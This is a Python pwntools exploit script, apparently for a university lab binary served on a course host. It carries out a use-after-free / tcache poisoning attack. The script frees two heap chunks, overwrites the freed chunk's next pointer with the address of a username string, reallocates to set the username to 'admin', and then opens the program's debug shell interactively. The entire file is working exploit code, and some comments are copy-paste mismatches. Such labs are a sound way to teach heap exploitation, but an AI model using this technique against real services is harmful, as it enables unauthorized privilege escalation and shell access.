''' Script Module Importing '''
from pwn import *

TARGET_ADR = 0x4040a0   # holds username string
TARGET_USR = b'admin'

''' Establish Connection '''
p = remote("csc748.hostbin.org", 7082)      # Test Script Against Server
#p = process("./8-2_lab.bin")              # Test Script Locally
#p = gdb.debug("./8-2_lab.bin")            # Debug with GDB

'''Allocate two chunks a and b of size s'''
print("\n[*] Allocating two chunks A and B of size S")
#CHUNK A
p.readuntil(b"Choice: ")  # Discard Program Output
print("    [*] Selecting Option (1) New")
p.sendline(b'1')          # Select Option (1) New

p.readuntil(b"Contents: ")  # Discard Program Output
print("    [*] Sending Chunk 'A' Contents: Buffer Fill")
p.sendline(b'AAAAAAAA')          # Fill Chunk A

'extract id number'
id_return = p.readuntil(b')')           # Read until the closing parenthesis
id_a = id_return.split(b'#')[1].split(b')')[0]    # Grab ID number
print(f"    [*] Chunk 'A' Saved with ID#: {int(id_a)}\n")


#CHUNK B
p.readuntil(b"Choice: ")  # Discard Program Output
print("    [*] Selecting Option (1) New")
p.sendline(b'1')          # Select Option (1) New

p.readuntil(b"Contents: ")  # Discard Program Output
print("    [*] Sending Chunk 'B' Contents: Buffer Fill")
p.sendline(b'BBBBBBBB')          # Fill Chunk B

'extract id number'
id_return = p.readuntil(b')')           # Read until the closing parenthesis
id_b = id_return.split(b'#')[1].split(b')')[0]    # Grab ID number
print(f"    [*] Chunk 'B' Saved with ID#: {int(id_b)}\n")

'''Free a, Free b'''
print("\n[*] Freeing A, Freeing B")
#CHUNK A
p.readuntil(b"Choice: ")  # Discard Program Output
print("    [*] Selecting Option (3) Delete")
p.sendline(b'3')          # Select Option (1) New

p.readuntil(b"ID?: ")  # Discard Program Output
print("    [*] Freeing Chunk A")
p.sendline(id_a)          # Free Chunk A

#CHUNK B
p.readuntil(b"Choice: ")  # Discard Program Output
print("    [*] Selecting Option (3) Delete")
p.sendline(b'3')          # Select Option (1) New

p.readuntil(b"ID?: ")  # Discard Program Output
print("    [*] Freeing Chunk A")
p.sendline(id_b)          # Free Chunk B

'''Use UaF vuln to overwrite bâ€™s next pointer with target address t'''
print("\n[*] Overwriting B Pointer")
p.readuntil(b"Choice: ")  # Discard Program Output
print("    [*] Selecting Option (4) Edit")
p.sendline(b'4')          # Select Option (1) New

p.readuntil(b"ID?: ")  # Discard Program Output
print("    [*] Selecting Chunk B")
p.sendline(id_b)          # Select Chunk B

p.readuntil(b"contents: ")  # Discard Program Output
print("    [*] Overwriting Pointer in Chunk B")
p.sendline(p64(TARGET_ADR))          # Overwrite Chunk B

'''Reallocate Chunks'''
print("\n[*] Reallocating Chunks")

#CHUNK B
p.readuntil(b"Choice: ")  # Discard Program Output
print("    [*] Selecting Option (1) New")
p.sendline(b'1')          # Select Option (1) New

p.readuntil(b"Contents: ")  # Discard Program Output
print("    [*] Sending Chunk 'B' Contents: Buffer Fill")
p.sendline(b'BBBBBBBB')          # Fill Chunk B

'extract id number'
id_return = p.readuntil(b')')           # Read until the closing parenthesis
id_b = id_return.split(b'#')[1].split(b')')[0]    # Grab ID number
print(f"    [*] Chunk 'B' Successfully Reallocated\n")

#CHUNK A
p.readuntil(b"Choice: ")  # Discard Program Output
print("    [*] Selecting Option (1) New")
p.sendline(b'1')          # Select Option (1) New

p.readuntil(b"Contents: ")  # Discard Program Output
print("    [*] Sending Chunk 'A' Contents: Overwrite Username")
p.sendline(TARGET_USR)          # Overwrite Chunk B

'extract id number'
id_return = p.readuntil(b')')           # Read until the closing parenthesis
id_a = id_return.split(b'#')[1].split(b')')[0]    # Grab ID number
print(f"    [*] Chunk 'A' Successfully Reallocated\n")
print(f"    [*] User Successfully Escalated to 'Admin'")


''' Access Debug Shell '''
print("\n[*] Accessing Debug Shell")

p.readuntil(b"Choice: ")  # Discard Program Output
print("    [*] Selecting Option (5) Debug shell")
p.sendline(b'5')          # Select Option (1) New


#print(hexdump(p.read(1500)))


''' Exploit Server '''
p.interactive()         # Start Interactive Session
